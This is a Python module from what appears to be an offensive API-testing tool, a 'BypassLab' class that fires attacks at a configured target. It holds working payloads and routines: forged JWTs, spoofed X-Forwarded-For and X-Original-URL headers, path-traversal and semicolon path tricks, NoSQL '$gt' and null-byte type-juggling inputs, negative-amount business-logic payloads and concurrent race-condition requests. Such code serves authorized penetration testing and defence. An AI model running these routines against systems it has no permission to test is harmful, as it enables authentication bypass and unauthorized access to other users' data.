"""
AGI-idor Bypass Lab — JWT manipulation, API gateway bypass,
input validation bypass, business logic bypass, and race conditions.
"""
from __future__ import annotations
import json, logging, time, concurrent.futures
from typing import Any, Optional
from colorama import Fore, Style
from utils.http_client import RotatingHTTPClient
from utils.jwt_utils import generate_forged_tokens
from core.auth_matrix import AuthMatrix

logger = logging.getLogger("agi-idor.bypass")

class BypassLab:
    def __init__(self, target_config: dict, http_client: RotatingHTTPClient, auth_matrix: AuthMatrix):
        self.config = target_config
        self.http = http_client
        self.auth = auth_matrix
        self.findings: list[dict] = []
        self.base_url = target_config.get("base_url", "")

    def test_jwt_bypasses(self, endpoints: list[dict]) -> list[dict]:
        """Test all JWT bypass variants against protected endpoints."""
        results = []
        attacker = self.auth.accounts.get("attacker", {})
        original_jwt = attacker.get("jwt_token", "") or attacker.get("headers", {}).get("Authorization", "").replace("Bearer ", "")
        if not original_jwt:
            logger.warning("No JWT token found for attacker account")
            return results
        forged = generate_forged_tokens(original_jwt)
        print(f"{Fore.CYAN}[JWT] Generated {len(forged)} forged tokens{Style.RESET_ALL}")
        for ep in endpoints[:20]:  # Cap to avoid excessive requests
            url = f"{self.base_url}{ep['path']}"
            method = ep.get("method", "GET")
            for variant in forged:
                try:
                    headers = {"Authorization": f"Bearer {variant['token']}"}
                    resp = self.http.request(method, url, headers=headers)
                    if resp.status_code == 200:
                        finding = {
                            "type": f"JWT Bypass ({variant['name']})",
                            "severity": "Critical",
                            "endpoint": ep["path"], "method": method,
                            "bypass_name": variant["name"],
                            "status_code": resp.status_code,
                        }
                        self.findings.append(finding)
                        results.append(finding)
                        print(f"{Fore.RED}[JWT BYPASS] {variant['name']} on {method} {ep['path']}{Style.RESET_ALL}")
                except Exception:
                    pass
        return results

    def test_api_gateway_bypass(self, endpoint: dict) -> list[dict]:
        """Test direct backend access, Host header manipulation, etc."""
        results = []
        path = endpoint.get("path", "")
        method = endpoint.get("method", "GET")
        self.auth.switch_account("attacker")
        bypass_tests = [
            ("X-Forwarded-For: 127.0.0.1", {"X-Forwarded-For": "127.0.0.1"}),
            ("X-Real-IP: 127.0.0.1", {"X-Real-IP": "127.0.0.1"}),
            ("X-Original-URL", {"X-Original-URL": path}),
            ("X-Rewrite-URL", {"X-Rewrite-URL": path}),
            ("Path traversal ./", None),  # handled below
            ("Trailing slash", None),
            ("Semicolon bypass", None),
        ]
        path_variants = [
            path, f"{path}/", f"{path};.js",
            path.replace("/api/", "/api/./"),
            f"/..{path}",
        ]
        for variant_path in path_variants:
            url = f"{self.base_url}{variant_path}"
            try:
                resp = self.http.request(method, url)
                if resp.status_code == 200:
                    results.append({
                        "type": "API Gateway Path Bypass",
                        "endpoint": variant_path,
                        "original_path": path,
                        "status_code": resp.status_code,
                    })
            except Exception:
                pass
        for name, headers in bypass_tests:
            if headers is None: continue
            url = f"{self.base_url}{path}"
            try:
                resp = self.http.request(method, url, headers=headers)
                if resp.status_code == 200:
                    results.append({
                        "type": f"API Gateway Header Bypass ({name})",
                        "endpoint": path, "status_code": resp.status_code,
                        "header": name,
                    })
                    print(f"{Fore.YELLOW}[GATEWAY] {name} bypass on {path}{Style.RESET_ALL}")
            except Exception:
                pass
        return results

    def test_input_validation_bypass(self, endpoint: dict) -> list[dict]:
        """Type juggling, Unicode normalization, null byte injection."""
        results = []
        url = f"{self.base_url}{endpoint['path']}"
        method = endpoint.get("method", "GET")
        if method not in ("POST","PUT","PATCH"): return results
        self.auth.switch_account("attacker")
        params = endpoint.get("params", ["id"])
        for param in params[:2]:
            type_juggling_payloads = [
                {param: "1"},        # string
                {param: 1},          # int
                {param: [1]},        # array
                {param: {"$gt": 0}}, # NoSQL
                {param: True},       # bool
                {param: None},       # null
                {param: "1\x00"},    # null byte
            ]
            for payload in type_juggling_payloads:
                try:
                    resp = self.http.request(method, url, json=payload)
                    if resp.status_code == 200:
                        results.append({
                            "type": "Input Validation Bypass",
                            "endpoint": endpoint["path"],
                            "payload": str(payload),
                            "status_code": resp.status_code,
                        })
                except Exception:
                    pass
        return results

    def test_business_logic_bypass(self, endpoint: dict) -> list[dict]:
        """Negative values, race conditions, state machine abuse."""
        results = []
        url = f"{self.base_url}{endpoint['path']}"
        method = endpoint.get("method", "GET")
        if method not in ("POST","PUT","PATCH"): return results
        self.auth.switch_account("attacker")
        negative_payloads = [
            {"quantity": -1}, {"amount": -100}, {"price": 0},
            {"count": 999999}, {"offset": -1},
        ]
        for payload in negative_payloads:
            try:
                resp = self.http.request(method, url, json=payload)
                if resp.status_code in (200, 201):
                    results.append({
                        "type": "Business Logic - Negative Value",
                        "endpoint": endpoint["path"],
                        "payload": str(payload),
                        "status_code": resp.status_code,
                    })
            except Exception:
                pass
        return results

    def test_race_condition(self, endpoint: dict, num_requests: int = 10) -> list[dict]:
        """Send concurrent requests to exploit TOCTOU."""
        results = []
        url = f"{self.base_url}{endpoint['path']}"
        method = endpoint.get("method", "GET")
        self.auth.switch_account("attacker")
        kwargs = {"json": {}} if method in ("POST","PUT","PATCH") else {}
        responses = []
        def fire():
            try:
                return self.http.request(method, url, **kwargs)
            except Exception:
                return None
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_requests) as executor:
            futures = [executor.submit(fire) for _ in range(num_requests)]
            for f in concurrent.futures.as_completed(futures):
                r = f.result()
                if r: responses.append(r)
        success_codes = [r.status_code for r in responses if r.status_code in (200, 201)]
        if len(success_codes) > 1:
            results.append({
                "type": "Race Condition (TOCTOU)",
                "endpoint": endpoint["path"],
                "concurrent_requests": num_requests,
                "successful_responses": len(success_codes),
            })
            print(f"{Fore.YELLOW}[RACE] {endpoint['path']}: {len(success_codes)}/{num_requests} succeeded{Style.RESET_ALL}")
        return results

    def run_all_tests(self, endpoints: list[dict]) -> list[dict]:
        """Orchestrate all bypass tests."""
        all_results = []
        if self.config.get("auth_mechanism") in ("bearer", "jwt"):
            all_results.extend(self.test_jwt_bypasses(endpoints))
        for ep in endpoints[:30]:
            all_results.extend(self.test_api_gateway_bypass(ep))
            all_results.extend(self.test_input_validation_bypass(ep))
            all_results.extend(self.test_business_logic_bypass(ep))
        self.findings.extend(all_results)
        return all_results
